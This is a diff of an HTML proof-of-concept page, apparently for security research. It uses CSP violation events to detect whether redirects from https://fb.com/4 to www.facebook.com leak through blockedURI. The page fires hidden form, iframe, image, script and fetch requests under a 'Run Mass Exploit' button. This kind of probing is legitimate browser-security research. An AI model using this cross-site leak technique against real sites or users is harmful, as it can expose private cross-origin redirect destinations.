@@ -2,76 +2,100 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline'; frame-src https://fb.com; img-src https://fb.com; script-src 'unsafe-inline' 'self' https://fb.com; style-src 'unsafe-inline' 'self' https://fb.com; connect-src 'self' https://fb.com; media-src https://fb.com; object-src https://fb.com; form-action https://fb.com;">
-    <title>Mass CSP Leak Tester - FIXED</title>
+    <meta http-equiv="Content-Security-Policy" content="
+        default-src 'self' 'unsafe-inline'; 
+        frame-src https://fb.com; 
+        img-src https://fb.com; 
+        script-src 'unsafe-inline' 'self' https://fb.com; 
+        form-action https://fb.com; 
+        connect-src 'self' https://fb.com;
+    ">
+    <title>Ultimate CSP Redirect Leak PoC</title>
     <style>
-        body { font-family: monospace; background: #1e1e1e; color: #fff; padding: 20px; }
-        .log-card { background: #2d2d2d; border: 1px solid #444; padding: 15px; margin-top: 10px; border-radius: 5px; }
-        .leak { color: #ff4444; font-weight: bold; }
-        .safe { color: #aaa; }
-        button { background: #00ff00; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; }
+        body { background-color: #121212; color: #e0e0e0; font-family: monospace; padding: 20px; }
+        h2 { color: #00ffcc; }
+        button { background-color: #ff4444; color: white; border: none; padding: 12px 24px; font-size: 16px; font-weight: bold; cursor: pointer; border-radius: 4px; }
+        button:hover { background-color: #cc0000; }
+        .log-box { background-color: #1e1e1e; border: 1px solid #333; padding: 15px; margin-top: 15px; border-radius: 5px; overflow-x: auto; }
+        .trigger-title { color: #f39c12; font-weight: bold; font-size: 1.1em; margin-bottom: 10px; display: inline-block; border-bottom: 1px solid #f39c12; }
+        .leak-highlight { color: #ff4444; font-weight: bold; }
+        #hiddenZone { display: none; }
     </style>
 </head>
 <body>
 
-    <h2 style="color: #00ff00;">🔥 CSP Redirect Leak Mass Tester</h2>
-    <button id="runBtn">Fire All Payloads</button>
+    <h2>🔥 Ultimate CSP Redirect Leak Tester</h2>
+    <p>Target: <code>https://fb.com/4</code> -> Redirects to <code>https://www.facebook.com/4</code></p>
+    
+    <button id="exploitBtn">Run Mass Exploit</button>
 
-    <div id="results"></div>
-    <div id="hiddenZone" style="display: none;"></div>
+    <div id="logContainer"></div>
+
+    <div id="hiddenZone">
+        <iframe name="stealthFrame"></iframe>
+    </div>
 
     <script>
-        const targetUrl = "https://fb.com/";
-        const resultsDiv = document.getElementById('results');
+        const targetUrl = 'https://fb.com/4';
+        const logContainer = document.getElementById('logContainer');
         const hiddenZone = document.getElementById('hiddenZone');
 
-        document.addEventListener('securitypolicyviolation', (e) => {
-            const triggerName = e.target ? (e.target.tagName || 'API') : 'Unknown';
+        // Listener buat nangkep laporan satpam (CSP)
+        document.addEventListener('securitypolicyviolation', e => {
+            const props = new Set('url,documentURL,blockedURL,documentURI,blockedURI,referrer,sample,sourceFile,script-sample,message,stack,reason,href,src,data,target'.split(','));
+            
+            // Cari tau tag apa yang bikin error
+            const triggerTag = e.target ? e.target.tagName : 'API/Fetch';
             const isLeaking = e.blockedURI.includes('www.facebook.com');
-            const statusColor = isLeaking ? 'leak' : 'safe';
-            const statusText = isLeaking ? '⚠️ REDIRECT LEAKED!' : '✅ Safe / Blocked normally';
+            const alertText = isLeaking ? '<span class="leak-highlight">[ LEAK DETECTED ]</span>' : '[ SAFE ]';
 
-            const card = document.createElement('div');
-            card.className = 'log-card';
-            card.innerHTML = `
-                <div style="color: #88ccff;">[ ${triggerName} ] - Directive: ${e.violatedDirective}</div>
-                <div>Status: <span class="${statusColor}">${statusText}</span></div>
-                <div class="${statusColor}">Blocked URI: ${e.blockedURI}</div>
-            `;
-            resultsDiv.appendChild(card);
+            // Bikin box buat nampilin JSON
+            const logBox = document.createElement('div');
+            logBox.className = 'log-box';
+            
+            // Header log
+            const header = document.createElement('div');
+            header.className = 'trigger-title';
+            header.innerHTML = `Component: &lt;${triggerTag}&gt; | Directive: ${e.violatedDirective} ${alertText}`;
+            
+            // JSON Dump
+            const pre = document.createElement('pre');
+            pre.style.color = "#a6e22e";
+            pre.textContent = JSON.stringify(e, [...props], 2);
+
+            logBox.appendChild(header);
+            logBox.appendChild(pre);
+            logContainer.appendChild(logBox);
         });
 
-        document.getElementById('runBtn').addEventListener('click', () => {
-            resultsDiv.innerHTML = "";
-            hiddenZone.innerHTML = "";
+        // Eksekusi semua payload secara bersamaan
+        document.getElementById('exploitBtn').addEventListener('click', () => {
+            logContainer.innerHTML = ''; // Bersihin log lama
+            
+            // 1. Test Form Submit (Pake target stealthFrame)
+            const form = document.createElement('form');
+            form.action = targetUrl;
+            form.method = 'GET';
+            form.target = 'stealthFrame'; 
+            hiddenZone.appendChild(form);
+            form.submit();
 
-            // Test 1: Iframe
+            // 2. Test Iframe
             const iframe = document.createElement('iframe');
             iframe.src = targetUrl;
             hiddenZone.appendChild(iframe);
 
-            // Test 2: Image
+            // 3. Test Image
             const img = document.createElement('img');
             img.src = targetUrl;
             hiddenZone.appendChild(img);
 
-            // Test 3: Script
+            // 4. Test Script
             const script = document.createElement('script');
             script.src = targetUrl;
             hiddenZone.appendChild(script);
 
-            // Test 4: Stylesheet
-            const link = document.createElement('link');
-            link.rel = "stylesheet";
-            link.href = targetUrl;
-            hiddenZone.appendChild(link);
-
-            // Test 5: Audio
-            const audio = document.createElement('audio');
-            audio.src = targetUrl;
-            hiddenZone.appendChild(audio);
-
-            // Test 6: Fetch API
+            // 5. Test Fetch API
             fetch(targetUrl, { mode: 'no-cors' }).catch(() => {});
         });
     </script>
